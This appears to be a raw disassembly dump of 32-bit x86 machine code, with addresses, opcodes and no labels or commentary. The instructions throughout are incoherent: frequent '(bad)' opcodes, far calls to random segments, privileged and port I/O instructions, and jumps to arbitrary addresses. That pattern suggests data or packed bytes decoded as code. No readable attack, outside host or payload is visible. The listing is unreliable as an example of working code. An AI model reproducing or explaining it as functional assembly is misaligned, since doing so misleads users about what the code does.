  43040e:	adc    BYTE PTR [ecx-0x10316f2e],dl
  430414:	dec    ebx
  430415:	or     al,0x7c
  430417:	popa   
  430418:	cmp    al,BYTE PTR [edx+0x6e]
  43041b:	(bad)  
  43041c:	and    al,0xae
  43041e:	or     BYTE PTR [edx],bh
  430420:	leave  
  430421:	mov    edi,DWORD PTR [esi-0x40]
  430424:	mov    edi,DWORD PTR [eax]
  430426:	les    ebp,FWORD PTR [ecx]
  430428:	fs mov ebp,0x514a660f
  43042e:	cli    
  43042f:	xor    eax,0xa9edb162
  430434:	adc    al,0xa0
  430436:	pop    edi
  430437:	(bad)  
  430438:	xor    bh,BYTE PTR [esi-0x19c906ab]
  43043e:	cwde   
  43043f:	dec    edi
  430440:	dec    ecx
  430441:	icebp  
  430442:	mov    eax,ds:0x2d4b20f0
  430447:	test   al,0xae
  430449:	or     ah,BYTE PTR ds:0xe1dc642b
  43044f:	push   es
  430450:	mov    ah,0x3a
  430452:	test   DWORD PTR [ebp-0x2b10debe],ecx
  430458:	pop    ss
  430459:	or     edi,DWORD PTR [edx-0x29]
  43045c:	stos   DWORD PTR es:[edi],eax
  43045d:	dec    esp
  43045e:	(bad)  
  43045f:	fwait
  430460:	ss sub eax,0x5bbc0d9b
  430466:	arpl   WORD PTR [ebp-0x1f],ax
  430469:	cs data16 mov ch,0xd9
  43046d:	jae    0x4304a9
  43046f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430470:	rcr    ecx,1
  430472:	jmp    0x775a79dc
  430477:	add    esi,DWORD PTR [edx-0x2c7328dd]
  43047d:	mov    ds:0xbf2068b,al
  430482:	lahf   
  430483:	retf   0x8689
  430486:	scas   eax,DWORD PTR es:[edi]
  430487:	imul   edi,DWORD PTR fs:[esi+0x2fa26e2],0x947ca77d
  430492:	imul   eax,esi,0xb453a22e
  430498:	hlt    
  430499:	push   esi
  43049a:	lahf   
  43049b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43049c:	imul   ecx,ebx,0xb6a42aa8
  4304a2:	call   0x34ae:0xfbb0e349
  4304a9:	out    0xd5,al
  4304ab:	dec    ecx
  4304ac:	ror    BYTE PTR [ebx],0xe9
  4304af:	nop
  4304b0:	push   esp
  4304b1:	shl    DWORD PTR [esi-0x65506a78],cl
  4304b7:	push   0x6dc7ff29
  4304bc:	cmp    eax,0x2aba0eb9
  4304c1:	stc    
  4304c2:	daa    
  4304c3:	out    0x5b,eax
  4304c5:	scas   al,BYTE PTR es:[edi]
  4304c6:	mov    ebp,0x9ad57e40
  4304cb:	int3   
  4304cc:	push   ss
  4304cd:	stos   BYTE PTR es:[edi],al
  4304ce:	dec    ebx
  4304cf:	xchg   edi,eax
  4304d0:	cs loope 0x4304ca
  4304d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4304d4:	rcl    DWORD PTR [ebx-0x4d],1
  4304d7:	jb     0x430555
  4304d9:	(bad)  
  4304da:	(bad)  [ebx]
  4304dc:	mov    dl,0xc7
  4304de:	cmp    BYTE PTR [ebx-0x7d1167b3],dh
  4304e4:	aaa    
  4304e5:	or     BYTE PTR [esi-0xe],bl
  4304e8:	rcl    BYTE PTR [edx-0x37],0x6f
  4304ec:	dec    edx
  4304ed:	jmp    0x430513
  4304ef:	mov    edx,0x519f72b2
  4304f4:	cmp    eax,DWORD PTR [ebx-0x9]
  4304f7:	lock cdq 
  4304f9:	pop    ss
  4304fa:	cmp    eax,0xe24b3f35
  4304ff:	jecxz  0x43053d
  430501:	cs in  al,0x44
  430504:	mov    dl,0xc2
  430506:	mov    eax,0x7d92d7a2
  43050b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43050c:	repnz or cl,BYTE PTR [eax+0x67a7be17]
  430513:	push   edi
  430514:	xor    ebx,edi
  430516:	xchg   ecx,eax
  430517:	loop   0x4304cb
  430519:	inc    esp
  43051a:	imul   edi,eax,0x3d
  43051d:	jle    0x43056c
  43051f:	div    DWORD PTR [esp+esi*1+0x7abc752f]
  430526:	sub    DWORD PTR [edx],ebx
  430528:	xchg   edx,eax
  430529:	fstp   QWORD PTR [ecx+ecx*4-0x65]
  43052d:	or     BYTE PTR [ecx-0x57739a3c],ah
  430533:	pop    edx
  430534:	jns    0x430572
  430536:	stos   BYTE PTR es:[edi],al
  430537:	sbb    eax,0x9b73b2cf
  43053c:	ins    BYTE PTR es:[edi],dx
  43053d:	sbb    BYTE PTR [edx-0x3899382b],bl
  430543:	loopne 0x430507
  430545:	arpl   WORD PTR [edx-0x26fd7d63],bx
  43054b:	arpl   WORD PTR [esi-0x38],bx
  43054e:	mov    ecx,0xaca5e2a7
  430553:	daa    
  430554:	inc    ecx
  430555:	jns    0x43052f
  430557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430558:	mov    BYTE PTR [esi+0x7a327e7],dl
  43055e:	jno    0x4305a9
  430560:	jnp    0x43053e
  430562:	ss mov ecx,0x268c56d5
  430568:	sahf   
  430569:	call   0xe5cbb99c
  43056e:	fisub  DWORD PTR [edi-0x5c65fda5]
  430574:	pop    ecx
  430575:	aaa    
  430576:	cmp    esi,ebp
  430578:	mov    al,ds:0x61a7e2df
  43057d:	call   0x5a7f:0x404e2180
  430584:	mov    dl,0x10
  430586:	(bad)  
  430587:	and    bh,BYTE PTR [eax]
  430589:	dec    edx
  43058a:	imul   esi,eax,0x7da50b5d
  430590:	adc    eax,0x3d0195d2
  430595:	ins    DWORD PTR es:[edi],dx
  430596:	call   0xa3ea:0x24a5b7b5
  43059d:	pop    ebx
  43059e:	cdq    
  43059f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4305a0:	mov    WORD PTR [esi-0x48bd4e06],ss
  4305a6:	pop    esi
  4305a7:	cwde   
  4305a8:	mov    dl,0x88
  4305aa:	sbb    DWORD PTR [eax+0x32],0xffffffec
  4305ae:	sbb    al,ah
  4305b0:	sbb    cl,BYTE PTR [ebx]
  4305b2:	push   cs
  4305b3:	std    
  4305b4:	mov    esi,0xc40ae1af
  4305b9:	sub    BYTE PTR [edx-0x3a930d29],bl
  4305bf:	mov    ebx,0xa7bf9ba0
  4305c4:	sub    ecx,DWORD PTR [ecx+ecx*4]
  4305c7:	mov    ds:0x5c7fcbbb,al
  4305cc:	mov    dl,0x66
  4305ce:	repz or cl,BYTE PTR [esi]
  4305d1:	into   
  4305d2:	fbstp  TBYTE PTR [edx]
  4305d4:	or     edi,DWORD PTR ds:[esi+ecx*1-0x23459ec4]
  4305dc:	inc    esi
  4305dd:	jb     0x430579
  4305df:	outs   dx,DWORD PTR ds:[esi]
  4305e0:	jns    0x430620
  4305e2:	out    dx,eax
  4305e3:	lods   al,BYTE PTR ds:[esi]
  4305e4:	mov    ds:0x8ea70b76,al
  4305e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305ea:	ret    0xab04
  4305ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4305ee:	ja     0x43061b
  4305f0:	mov    ch,0xf2
  4305f2:	pop    esp
  4305f3:	jmp    0x4305eb
  4305f5:	(bad)  
  4305f6:	retf   0x1af4
  4305f9:	call   0x48e8af9b
  4305fe:	jp     0x43066d
  430600:	repnz mov edi,0x4690a36
  430606:	call   0x9af5:0x33361d2
  43060d:	in     al,0x86
  43060f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430610:	cdq    
  430611:	mov    BYTE PTR [ebx-0x6b],0x1c
  430615:	jnp    0x4305b0
  430617:	repnz mov ch,0x62
  43061a:	fsubrp st(7),st
  43061c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43061d:	ins    DWORD PTR es:[edi],dx
  43061e:	fidiv  DWORD PTR [ebx+edx*4+0x44]
  430622:	loop   0x4305cb
  430624:	or     edi,esp
  430626:	adc    BYTE PTR [esi-0x45394990],dh
  43062c:	scas   eax,DWORD PTR es:[edi]
  43062d:	xor    dl,BYTE PTR [ecx-0x6583f379]
  430633:	jmp    FWORD PTR [edx+0x6cc972d9]
  430639:	mov    ds:0xb744395,eax
  43063e:	xlat   BYTE PTR ds:[ebx]
  43063f:	mov    ebx,DWORD PTR [edx-0x19fc2534]
  430645:	sbb    DWORD PTR [ebx-0x7a4874f9],0xffffff87
  43064c:	test   DWORD PTR [edx+ebp*8-0x72f4a177],0xcedc07b6
  430657:	ret    0x7a17
  43065a:	cli    
  43065b:	scas   eax,DWORD PTR es:[edi]
  43065c:	pop    edx
  43065d:	xchg   ebp,eax
  43065e:	cmp    eax,0xf6086bc5
  430663:	fisub  DWORD PTR fs:[eax-0x5d]
  430667:	push   ebp
  430668:	xor    eax,0xa96c538b
  43066d:	rol    esi,cl
  43066f:	idiv   BYTE PTR [edi+edx*1-0x7f8de180]
  430676:	or     ebx,DWORD PTR [ecx]
  430678:	sub    eax,0xf2a79840
  43067d:	nop
  43067e:	mov    esp,0xdb668ae0
  430683:	test   eax,0xc3f57dad
  430688:	mov    dh,0x9d
  43068a:	mov    ah,BYTE PTR [ebx+0x6f435631]
  430690:	in     eax,0xdc
  430692:	push   0xbbcdb4ae
  430697:	pop    eax
  430698:	mov    cl,0xe6
  43069a:	jnp    0x430636
  43069c:	xor    ch,BYTE PTR [edx-0x60]
  43069f:	mov    bp,0xccc9
  4306a3:	lea    esi,[esi+0x6b]
  4306a6:	jmp    0x43068d
  4306a8:	or     dl,BYTE PTR [esi+eiz*1-0x59]
  4306ac:	and    dh,BYTE PTR [edi]
  4306ae:	arpl   WORD PTR [ebx],bp
  4306b0:	std    
  4306b1:	pop    esi
  4306b2:	mov    esi,0x7973bdae
  4306b7:	cli    
  4306b8:	test   eax,0xf6c8236b
  4306bd:	mov    DWORD PTR [eax-0x59],esp
  4306c0:	or     al,0xb1
  4306c2:	scas   al,BYTE PTR es:[edi]
  4306c3:	push   eax
  4306c4:	sbb    eax,0xb20739de
  4306c9:	add    ah,BYTE PTR [esi]
  4306cb:	(bad)  
  4306cc:	out    0x3,al
  4306ce:	test   eax,0x7327fb79
  4306d3:	out    0x76,al
  4306d5:	or     ebp,DWORD PTR [edi+0x27]
  4306d8:	fwait
  4306d9:	mov    ds:0x72a58f39,al
  4306df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4306e0:	test   BYTE PTR [esi-0xf],bh
  4306e3:	pop    ebx
  4306e4:	mov    DWORD PTR [eax+0x8595fb0],ecx
  4306ea:	rol    edi,0x2b
  4306ed:	outs   dx,DWORD PTR ds:[esi]
  4306ee:	jmp    0x4306db
  4306f0:	mov    dl,0xad
  4306f2:	mov    ecx,0x1e7e6615
  4306f7:	and    DWORD PTR [ebx+0xa603f0b],ebx
  4306fd:	mov    cl,0xa9
  4306ff:	adc    esi,ecx
  430701:	pop    es
  430702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430703:	(bad)  
  430704:	clc    
  430705:	hlt    
  430706:	call   0x3538:0xa8d1ae7
  43070d:	sbb    BYTE PTR [ebp-0x59],0x84
  430711:	jb     0x4306fa
  430713:	xor    esi,ecx
  430715:	sbb    al,0xd2
  430717:	push   edi
  430718:	call   0x8fe03144
  43071d:	or     eax,DWORD PTR [edi-0x4b]
  430720:	ss adc bl,dl
  430723:	sbb    eax,0xae9a1dd1
  430728:	mov    edx,ss
  43072a:	ja     0x43075b
  43072c:	aas    
  43072d:	sub    al,0xee
  43072f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430730:	push   edx
  430731:	stc    
  430732:	inc    esi
  430733:	(bad)  
  430734:	jle    0x4306d1
  430736:	xor    edi,edi
  430738:	mov    cl,0xce
  43073a:	mov    eax,ds:0xe64a78ba
  43073f:	outs   dx,DWORD PTR ds:[esi]
  430740:	mov    dh,0x57
  430742:	xchg   ebp,eax
  430743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430744:	test   BYTE PTR [ebx+0x32cbc7ca],0xdb
  43074b:	inc    ebx
  43074c:	(bad)  
  43074d:	cli    
  43074e:	ret    0x3c63
  430751:	je     0x4306ed
  430753:	cdq    
  430754:	push   edx
  430755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430756:	neg    esp
  430758:	jl     0x4307d7
  43075a:	dec    eax
  43075b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43075c:	mov    esi,0xa1ac7cfa
  430761:	pusha  
  430762:	push   ds
  430763:	dec    ebp
  430764:	lods   al,BYTE PTR ds:[esi]
  430765:	push   esi
  430766:	sub    DWORD PTR [esi+0x72],ebp
  430769:	push   ecx
  43076a:	out    dx,al
  43076b:	sub    ebp,DWORD PTR [ebx-0x4b588e34]
  430771:	sub    BYTE PTR [ebx-0x3e],bl
  430774:	(bad)  
  430775:	pop    ss
  430776:	cmc    
  430777:	cs mov dl,0x53
  43077a:	cwde   
  43077b:	sgdtd  [esi+ecx*8]
  43077f:	and    DWORD PTR [edi+0x5],0xfee2ed0f
  430786:	jp     0x430798
  430788:	jbe    0x4307a7
  43078a:	or     ah,cl
  43078c:	mov    al,0x86
  43078e:	push   ebx
  43078f:	push   edi
  430790:	mov    edx,0x7d271c46
  430795:	scas   eax,DWORD PTR es:[edi]
  430796:	test   DWORD PTR [ecx],ebx
  430798:	and    bl,BYTE PTR [esi-0x404d1cb6]
  43079e:	aas    
  43079f:	mov    eax,ds:0x9f805d1c
  4307a4:	inc    esp
  4307a5:	div    edx
  4307a7:	call   0x8351:0xb61a97aa
  4307ae:	mov    BYTE PTR [esi],cl
  4307b0:	pop    esp
  4307b1:	add    bl,BYTE PTR [ecx-0x685b6ded]
  4307b7:	test   DWORD PTR [esi+0x103956d3],edi
  4307bd:	or     esp,DWORD PTR [edi]
  4307bf:	xchg   esp,eax
  4307c0:	xor    eax,0x975b1e0d
  4307c5:	cdq    
  4307c6:	lahf   
  4307c7:	daa    
  4307c8:	xchg   esp,eax
  4307c9:	scas   al,BYTE PTR es:[edi]
  4307ca:	xlat   BYTE PTR ds:[ebx]
  4307cb:	data16 jb 0x4307b6
  4307ce:	dec    ebp
  4307cf:	inc    ebx
  4307d0:	pop    eax
  4307d1:	or     edx,ebp
  4307d3:	fidivr DWORD PTR [ebx-0x68]
  4307d6:	ss push ecx
  4307d8:	jg     0x4307a7
  4307da:	push   0xd658b8b0
  4307df:	fstp   QWORD PTR [edx-0x408651e]
  4307e5:	push   ebx
  4307e6:	xchg   DWORD PTR [edi],edi
  4307e8:	arpl   WORD PTR [edi+0x48],di
  4307eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4307ec:	jge    0x4307ac
  4307ee:	xor    cl,BYTE PTR [ecx+esi*2-0x44]
  4307f2:	clc    
  4307f3:	clc    
  4307f4:	retf   
  4307f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4307f6:	call   0xbe42:0x7681d370
  4307fd:	pop    edi
  4307fe:	hlt    
  4307ff:	mov    ecx,0x9a12035c
  430804:	xor    al,ch
  430806:	arpl   WORD PTR [ecx],ax
  430808:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  43080a:	mov    ah,0x2d
  43080c:	mov    dl,0xc
  43080e:	mov    WORD PTR [ebx],ss
  430810:	dec    ebp
  430811:	rcr    DWORD PTR [edi-0x2d],cl
  430814:	aaa    
  430815:	or     ebp,DWORD PTR [edx+0x666b98d4]
  43081b:	aaa    
  43081c:	mov    ah,0x66
  43081e:	call   0x4c95:0x228d3b3c
  430825:	inc    ebx
  430826:	not    BYTE PTR [edi-0x7b]
  430829:	pushf  
  43082a:	loop   0x430820
  43082c:	mov    dl,0xf9
  43082e:	dec    ecx
  43082f:	not    DWORD PTR [edx+esi*4]
  430832:	out    0xf8,al
  430834:	pop    ebx
  430835:	or     ecx,DWORD PTR [edx+0x13]
  430838:	push   esi
  430839:	xchg   BYTE PTR [edx-0x6b299bf3],cl
  43083f:	xor    dh,0x9d
  430842:	inc    ebp
  430843:	add    BYTE PTR [edi+0x21],bh
  430846:	dec    ebp
  430847:	into   
  430848:	inc    ebx
  430849:	xchg   ebx,eax
  43084a:	inc    eax
  43084b:	fistp  QWORD PTR [esi-0x44]
  43084e:	mov    esp,DWORD PTR [edi+0x1d86716e]
  430854:	aam    0xe2
  430856:	sub    dh,BYTE PTR [ecx]
  430858:	mov    dl,0x78
  43085a:	nop
  43085b:	jmp    0x5d83a956
  430860:	push   ecx
  430861:	out    0xd0,eax
  430863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430864:	push   0x26
  430866:	aad    0x58
  430868:	shl    BYTE PTR [edx],1
  43086a:	xor    BYTE PTR [edx],ch
  43086c:	jge    0x4308b5
  43086e:	sub    BYTE PTR [edi],al
  430870:	ficom  WORD PTR [ebx+0xbec3905]
  430876:	adc    al,0x65
  430878:	pop    ds
  430879:	xor    BYTE PTR [esi+edi*2+0x779d54d3],bl
  430880:	aaa    
  430881:	out    dx,eax
  430882:	add    eax,ebp
  430884:	bound  edi,QWORD PTR [edx-0x3e]
  430887:	adc    eax,0x631137d7
  43088c:	mov    dl,0xb5
  43088e:	retf   
  43088f:	xchg   edi,eax
  430890:	in     eax,0xed
  430892:	mov    cl,0xb3
  430894:	cli    
  430895:	pop    edi
  430896:	pop    ecx
  430897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430898:	mov    ?,WORD PTR [esi]
  43089a:	jbe    0x43089d
  43089c:	ret    0x3f4c
  43089f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4308a0:	xor    BYTE PTR [edx-0x7e24918d],bl
  4308a6:	sub    BYTE PTR [ebx-0x34],dl
  4308a9:	out    0x98,al
  4308ab:	outs   dx,DWORD PTR ds:[esi]
  4308ac:	aaa    
  4308ad:	sub    eax,0xeb1cc770
  4308b2:	and    ah,BYTE PTR [esi-0x5016f4b2]
  4308b8:	push   ecx
  4308b9:	je     0x43090b
  4308bb:	pop    esi
  4308bc:	ret    0x6844
  4308bf:	out    0x10,al
  4308c1:	repnz fcmove st,st(7)
  4308c4:	inc    edx
  4308c5:	aam    0xa4
  4308c7:	aas    
  4308c8:	call   0xe3dd9c4a
  4308cd:	daa    
  4308ce:	sub    ah,BYTE PTR [edi+0x4a4eb11c]
  4308d4:	sub    DWORD PTR [ebx*8-0x658311de],ebp
  4308db:	jg     0x430928
  4308dd:	xor    DWORD PTR [ebp-0x21],0x3dee0b59
  4308e4:	dec    edx
  4308e5:	pop    edi
  4308e6:	mov    bl,0xbc
  4308e8:	or     al,0x57
  4308ea:	out    dx,al
  4308eb:	(bad)  
  4308ec:	enter  0x9a66,0xb2
  4308f0:	repz mov cs,WORD PTR [esi]
  4308f3:	push   cs
  4308f4:	int    0x6d
  4308f6:	add    ah,BYTE PTR [edi-0xd1b3ab4]
  4308fc:	ds adc eax,0x3898d69
  430902:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  430904:	loop   0x43096b
  430906:	shr    DWORD PTR [esi-0x58e7e156],0xa3
  43090d:	sbb    al,0x51
  43090f:	cmp    ebx,DWORD PTR [ebx-0x4dba1bee]
  430915:	or     cl,BYTE PTR [edx+0x22fbd4b1]
  43091b:	rol    BYTE PTR [ebx+0x7761230b],0x7e
  430922:	xlat   BYTE PTR ds:[ebx]
  430923:	cmp    BYTE PTR [edx-0x51356acb],dl
  430929:	sub    dh,bl
  43092b:	out    0x3d,eax
  43092d:	(bad)  
  43092f:	pop    ss
  430930:	dec    ecx
  430931:	or     ecx,esp
  430933:	cmp    DWORD PTR [eax+edi*1+0x51],0x9a028e40
  43093b:	daa    
  43093c:	push   ecx
  43093d:	cmp    al,BYTE PTR [edx]
  43093f:	xor    BYTE PTR [edx+0x57],dh
  430942:	retf   
  430943:	mov    ds:0x92555653,eax
  430948:	fxch   st(3)
  43094a:	shl    eax,0x57
  43094d:	push   ebx
  43094e:	call   0x483c:0x1d6c4fe3
  430955:	mov    ebp,0x6adea48c
  43095a:	fwait
  43095b:	popf   
  43095c:	shl    DWORD PTR [esi+0xb],0x68
  430960:	shl    BYTE PTR [eax],0x1a
  430963:	mov    al,0x35
  430965:	std    
  430966:	loop   0x430922
  430968:	into   
  430969:	in     eax,dx
  43096a:	iret   
  43096b:	daa    
  43096c:	pop    ebx
  43096d:	stos   BYTE PTR es:[edi],al
  43096e:	or     al,BYTE PTR [eax+ecx*2+0x3b]
  430972:	xchg   DWORD PTR [ebp+0x115578e8],esi
  430978:	jmp    0x28853f88
  43097d:	pop    esi
  43097e:	shl    DWORD PTR [edi-0x6109f995],cl
  430984:	mov    ebp,0xb27012f6
  430989:	mov    DWORD PTR [ebp-0x14],esi
  43098c:	mov    dl,BYTE PTR [ecx+0x40]
  43098f:	(bad)  
  430990:	push   ecx
  430991:	or     ebx,DWORD PTR [esi]
  430993:	add    BYTE PTR [edi+ebx*2-0x65],ah
  430997:	fnstcw WORD PTR [eax-0x66e76550]
  43099d:	pop    es
  43099e:	and    BYTE PTR [edi-0x587c75b9],bl
  4309a4:	fcmove st,st(1)
  4309a6:	out    0x46,eax
  4309a8:	mov    bl,0x73
  4309aa:	je     0x43095e
  4309ac:	lods   al,BYTE PTR ds:[esi]
  4309ad:	bound  eax,QWORD PTR es:[edi]
  4309b0:	push   ds
  4309b1:	inc    ebx
  4309b2:	call   0x69be:0xf56288ca
  4309b9:	mov    ebx,0x88eca02f
  4309be:	fcmovnbe st,st(2)
  4309c0:	mov    bh,0xf8
  4309c2:	sbb    DWORD PTR ss:[edx+0x4d],esp
  4309c6:	push   ecx
  4309c7:	lods   al,BYTE PTR ds:[esi]
  4309c8:	int    0x2d
  4309ca:	cmp    bh,BYTE PTR [eax]
  4309cc:	sbb    BYTE PTR [eax],bl
  4309ce:	out    dx,al
  4309cf:	push   ebx
  4309d0:	mov    ebp,0xe77aa214
  4309d5:	retf   
  4309d6:	in     al,dx
  4309d7:	popa   
  4309d8:	pop    esi
  4309d9:	cmp    eax,0x4537a0c1
  4309de:	icebp  
  4309df:	xor    esp,esp
  4309e1:	sbb    esi,DWORD PTR [ecx+ebp*1-0x78]
  4309e5:	and    DWORD PTR [eax+0x4b8b94b0],0x55
  4309ec:	cli    
  4309ed:	jle    0x4309db
  4309ef:	aaa    
  4309f0:	gs or  al,0xf3
  4309f3:	outs   dx,BYTE PTR ds:[esi]
  4309f4:	es xor al,0x97
  4309f7:	push   edi
  4309f8:	mov    esp,0xaeb5077f
  4309fd:	std    
  4309fe:	sub    al,0x3e
  430a00:	xor    al,BYTE PTR [ecx+0x3d427965]
  430a06:	retf   0xe7a7
  430a09:	mov    edx,0x421e423f
  430a0e:	sti    
  430a0f:	and    al,0xb2
  430a11:	rcl    al,cl
  430a13:	loop   0x430a74
  430a15:	sub    DWORD PTR [esi+0x460b1abd],ebp
  430a1b:	mov    esi,0xf8704b33
  430a20:	ins    BYTE PTR es:[edi],dx
  430a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430a22:	xchg   ebp,eax
  430a23:	jmp    0x7b1cded
  430a28:	mov    ah,0xba
  430a2a:	imul   edi,DWORD PTR [esi+edx*4+0xa],0x554c0894
  430a32:	jbe    0x430a11
  430a34:	xchg   ebx,eax
  430a35:	imul   DWORD PTR [edx+0x677bb214]
  430a3b:	pushf  
  430a3c:	ror    BYTE PTR [esi+0x4cf7c57],0xe2
  430a43:	xor    eax,0xc15a6952
  430a48:	and    DWORD PTR [esi+0x12b20cb8],edi
  430a4e:	enter  0x6359,0xd4
  430a52:	xor    al,0xac
  430a54:	lock or ebp,DWORD PTR [edi-0x1f]
  430a58:	adc    dh,BYTE PTR ds:0x66ed03f8
  430a5e:	mov    DWORD PTR [ebp+ebp*4-0x74],edx
  430a62:	call   0x8ff5:0x113d81b1
  430a69:	or     edi,edi
  430a6b:	push   ecx
  430a6c:	mov    cl,0xad
  430a6e:	xchg   ebx,eax
  430a6f:	test   eax,0x559a963a
  430a74:	arpl   WORD PTR [ebx-0x416c19dd],cx
  430a7a:	push   es
  430a7b:	inc    ebp
  430a7c:	int    0xb
  430a7e:	sbb    BYTE PTR ds:0x26f46014,0xaa
  430a85:	int3   
  430a86:	call   0x86c6:0x2e6181ec
  430a8d:	ins    DWORD PTR es:[edi],dx
  430a8e:	(bad)  
  430a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430a90:	dec    ebx
  430a91:	rcr    BYTE PTR [edi+ecx*2+0x47181c0f],cl
  430a98:	ds xchg edx,eax
  430a9a:	call   0xcd59:0xd33dab50
  430aa1:	dec    edi
  430aa2:	pop    ds
  430aa3:	mov    edx,0x9c682cec
  430aa8:	mov    dl,0x47
  430aaa:	cdq    
  430aab:	sub    eax,0x291d58b8
  430ab0:	mov    dl,0xec
  430ab2:	rol    DWORD PTR [esi-0x674f6ab7],0xdb
  430ab9:	or     edx,edx
  430abb:	jne    0x430b29
  430abd:	mov    dl,0xf7
  430abf:	pusha  
  430ac0:	addr16 repnz fwait
  430ac3:	(bad)  
  430ac4:	mov    fs,WORD PTR [esi-0x1a09fb8b]
  430aca:	fisubr DWORD PTR [eax]
  430acc:	or     BYTE PTR [eax+esi*1],cl
  430acf:	test   eax,0xc13113e8
  430ad4:	cld    
  430ad5:	fwait
  430ad6:	jp     0x430b31
  430ad8:	push   eax
  430ad9:	or     BYTE PTR [esi+edx*4-0xad02c4e],al
  430ae0:	pop    ds
  430ae1:	in     eax,0x7f
  430ae3:	xor    edi,DWORD PTR [eax]
  430ae5:	or     edx,DWORD PTR [edi+edx*2]
  430ae8:	sub    al,0x28
  430aea:	adc    esi,DWORD PTR [edx]
  430aec:	(bad)  
  430aed:	jecxz  0x430a88
  430aef:	adc    esp,DWORD PTR [edx+0x39c8e35c]
  430af5:	mov    edx,ds
  430af7:	in     al,dx
  430af8:	xor    eax,0x425d9034
  430afd:	or     esi,esp
  430aff:	jp     0x430ab2
  430b01:	aaa    
  430b02:	jmp    0x1a0d:0xb475e84d
  430b09:	mov    ah,0x84
  430b0b:	ins    BYTE PTR es:[edi],dx
  430b0c:	jb     0x430af9
  430b0e:	mov    ebp,0xa43bc589
  430b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430b14:	push   esp
  430b15:	add    esi,DWORD PTR [ecx]
  430b17:	and    dl,dl
  430b19:	sbb    al,0x6b
  430b1b:	sub    eax,DWORD PTR [edx+0x2e]
  430b1e:	cdq    
  430b1f:	ret    0x7545
  430b22:	sub    esi,DWORD PTR [edi+0x66]
  430b25:	repz adc esi,ebx
  430b28:	sbb    eax,0xea3fdf19
  430b2d:	or     esi,DWORD PTR [eax]
  430b2f:	outs   dx,WORD PTR ds:[esi]
  430b31:	mov    ds:0x96b2d116,eax
  430b36:	sub    eax,0xdac79792
  430b3b:	ror    BYTE PTR [ebp+0xb],1
  430b3e:	mov    esi,0xc2ad238b
  430b43:	inc    ebx
  430b44:	ror    BYTE PTR [ecx-0x289e4066],0x25
  430b4b:	stos   DWORD PTR es:[edi],eax
  430b4c:	(bad)  
  430b4d:	mov    bl,0xea
  430b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430b50:	xchg   esi,eax
  430b51:	mov    ds,esp
  430b53:	mov    BYTE PTR [esi*1-0x4a4df05a],bl
  430b5a:	pop    esi
  430b5b:	jbe    0x430af8
  430b5d:	jne    0x430aea
  430b5f:	les    edi,FWORD PTR [edx]
  430b61:	or     ebp,DWORD PTR [edx]
  430b63:	xchg   edi,eax
  430b64:	hlt    
  430b65:	xor    al,0xbb
  430b67:	add    ebx,esi
  430b69:	cld    
  430b6a:	call   0x4305:0x411f283c
  430b71:	out    dx,al
  430b72:	push   ebp
  430b73:	call   0xa7a1:0xa7650fb9
  430b7a:	push   ebx
  430b7b:	or     BYTE PTR [eax],al
  430b7d:	mov    eax,ds:0x6bb0068b
  430b82:	mov    WORD PTR [edx+0x1c],ss
  430b85:	push   eax
  430b86:	arpl   WORD PTR [edi+0x6c],ax
  430b89:	add    esi,DWORD PTR [ebx]
  430b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430b8c:	push   ss
  430b8d:	adc    esp,DWORD PTR [ebp+0x50]
  430b90:	jae    0x430bec
  430b92:	push   ecx
  430b93:	stc    
  430b94:	mov    dl,0xa
  430b96:	hlt    
  430b97:	fisttp WORD PTR [eax+0x70]
  430b9a:	add    al,0x8f
  430b9c:	lock or BYTE PTR [edi],dl
  430b9f:	ret    0xe116
  430ba2:	xor    ecx,DWORD PTR [eax+0x72]
  430ba5:	aam    0x62
  430ba7:	mov    WORD PTR [edx+0x75e2a990],?
  430bad:	xor    eax,0x7d45a4dc
  430bb2:	jb     0x430b51
  430bb4:	pop    eax
  430bb5:	and    eax,0xc209049a
  430bba:	aad    0x77
  430bbc:	stc    
  430bbd:	(bad)  
  430bbe:	jmp    0x430c29
  430bc0:	mov    dl,0xd2
  430bc2:	cmp    cl,BYTE PTR [eax]
  430bc4:	pop    ebp
  430bc5:	ja     0x430c3d
  430bc7:	pop    esi
  430bc8:	fwait
  430bc9:	xor    DWORD PTR [edi],edx
  430bcb:	xor    BYTE PTR [edx],0x95
  430bce:	xor    eax,DWORD PTR ds:0x9a8aac13
  430bd4:	mov    dl,0x20
  430bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430bd7:	pop    ebx
  430bd8:	test   al,0x92
  430bda:	and    BYTE PTR [edi-0x33],cl
  430bdd:	out    0x8e,eax
  430bdf:	inc    ebp
  430be0:	adc    al,0xb
  430be2:	bound  esi,QWORD PTR [eax]
  430be4:	sahf   
  430be5:	ja     0x430ba0
  430be7:	jno    0x430bca
  430be9:	in     eax,dx
  430bea:	call   0x600e:0x6620359
  430bf1:	aaa    
